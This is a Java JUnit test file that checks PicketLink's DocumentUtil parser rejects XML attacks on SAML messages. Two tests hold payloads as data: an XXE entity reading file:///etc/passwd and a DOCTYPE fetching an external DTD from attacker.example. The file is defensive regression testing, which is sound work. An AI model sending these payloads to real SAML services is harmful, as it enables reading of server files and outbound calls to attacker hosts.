/*
 * JBoss, Home of Professional Open Source
 *
 * Copyright 2026 PicketLink contributors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.picketlink.test.identity.federation.api.util;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import org.junit.Test;
import org.picketlink.common.exceptions.ParsingException;
import org.picketlink.common.util.DocumentUtil;
import org.w3c.dom.Document;

/**
 * Security regression tests locking in the XML parser hardening of {@link DocumentUtil}:
 * the SAML attack classes that rely on a permissive parser (XXE, entity-expansion DoS,
 * external stylesheet/entity injection) must fail to parse at all.
 */
public class ParserHardeningUnitTestCase {

    private static Document parse(String xml) throws Exception {
        return DocumentUtil.getDocument(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    public void rejectsDoctypeDeclaration() {
        String xml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                + "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">&xxe;</samlp:Response>";
        assertParsingRejected(xml, "DOCTYPE declarations must be rejected");
    }

    @Test
    public void rejectsExternalGeneralEntityWithoutDoctypeInnerDecl() {
        // DOCTYPE pointing at an external DTD (parameter entity / external DTD loading)
        String xml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE samlp:Response SYSTEM \"http://attacker.example/evil.dtd\">"
                + "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"/>";
        assertParsingRejected(xml, "external DTDs must be rejected");
    }

    @Test
    public void parsesOrdinarySamlDocument() throws Exception {
        String xml = "<?xml version=\"1.0\"?>"
                + "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"r1\"/>";
        Document document = parse(xml);
        assertTrue(document.getDocumentElement().getLocalName().equals("Response"));
    }

    private static void assertParsingRejected(String xml, String message) {
        try {
            parse(xml);
            fail(message + " but parsing unexpectedly succeeded");
        } catch (Exception expected) {
            // parser hardening kicked in
        }
    }
}
